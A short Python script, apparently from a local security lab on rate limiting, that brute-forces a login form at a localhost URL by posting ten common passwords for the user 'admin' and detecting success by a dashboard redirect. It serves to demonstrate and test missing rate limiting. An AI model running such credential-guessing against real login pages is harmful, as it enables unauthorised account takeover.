import requests
import time

# Target URL
url = "http://localhost/security-lab/004-rate-limiting/login.php"

passwords = ["admin", "password", "123456", "admin123", "letmein", "qwerty", "password123", "user1", "test", "12345678"]

def brute_force(username):
    print(f"\nStarting a brute force attack on the account: {username}")
    print("=" * 50)
    
    attempt = 1
    for password in passwords:
        print(f"Trying {attempt}: {username}:{password}")
        
        data = {
            'username': username,
            'password': password
        }
        
        response = requests.post(url, data=data)
        
        if response.url.endswith('dashboard.php'):
            print(f"\n[SUCCESS] Password found: {password}")
            return True
        
        attempt += 1
        # time.sleep(1)  
    
    print("\n[FAILED] Password not found in wordlist")
    return False

if __name__ == "__main__":
    target_username = "admin"  
    brute_force(target_username)